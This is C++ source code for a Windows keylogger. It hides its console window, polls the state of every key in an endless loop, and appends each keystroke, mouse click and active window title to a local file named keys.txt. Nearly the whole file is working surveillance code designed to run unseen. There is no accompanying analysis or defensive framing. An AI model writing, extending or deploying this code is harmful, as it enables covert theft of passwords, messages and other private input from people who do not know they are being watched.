#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream> 

//Logging Varibles
using namespace std;
std::string line;
char previousWinTitle[256] = "";
std::string currentLine = "";

//Functions
void Logging();
int App();

//Hides terminal
int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    App();
    return 0;
}

//Gets name of application
int App(){
    ofstream log;
    log.open("keys.txt", ios::app);
    HWND hwnd = GetForegroundWindow();
    if (hwnd == nullptr) {
        log << "No active window found.\n";
        return 1;
    }

    //Prints name in log and checks to make sure they are on different website
    char windowTitle[256];
    GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
    if(strcmp(previousWinTitle, windowTitle) != 0){
        log << "Currently active application: " << windowTitle << std::endl << "\n";
    }
    strcpy(previousWinTitle, windowTitle);
    Logging();
    return 0;
}

//Way to organize
void Logging(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char c;
    bool caps = false;
    while (true)
    {
        for(c = 0; c <= 254; c++){
            if(GetAsyncKeyState(c) & 0x1)
            {
                ofstream log;
                log.open("keys.txt", ios::app);
                switch (c) {
                    //Backspace
                    case VK_BACK: 
                        if(!currentLine.empty())
                            {
                                currentLine.pop_back();
                                break;
                            } else {
                                currentLine += "[backspace]";
                                break;
                            }
                    break;
                    //Enter
                    case VK_RETURN:
                        log << currentLine << endl; //go to next line
                        currentLine = "";
                        App();
                        break;
                    //Shift
                    case VK_SHIFT:
                        if ((GetKeyState(VK_SHIFT) & 0x0001)!=0){
                            caps = true;
                            currentLine += "[Shift Up]";
                        } else {
                            caps = false;
                            currentLine += "[Shift Down]";
                        }
                        break;
                    //Control
                    case VK_CONTROL:
                        currentLine += "[control]";
                        break;
                    //Cap Lock
                    case VK_CAPITAL:
                        if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0){
                            caps = true;
                            currentLine += "[caps on]";
                        } else {
                            caps = false;
                            currentLine += "[caps off]";
                        }
                        break;
                    //Tab
                    case VK_TAB:
                        currentLine += "[tab]";
                        break;
                    case VK_MENU:
                        currentLine += "[alt]";
                    //Left Mouse Click
                    case VK_LBUTTON:
                        currentLine += "[lc]\n";
                        App();
                        break;
                    //Right Mouse Click
                    case VK_RBUTTON:
                        currentLine += "[rc]\n";
                        App();
                        break;
                    default:
                        if(!caps){
                            char lc = tolower(c);
                            currentLine += lc;
                        } else {
                            currentLine += c;
                        }
                }
                log.close();
            }
        }
    }
}
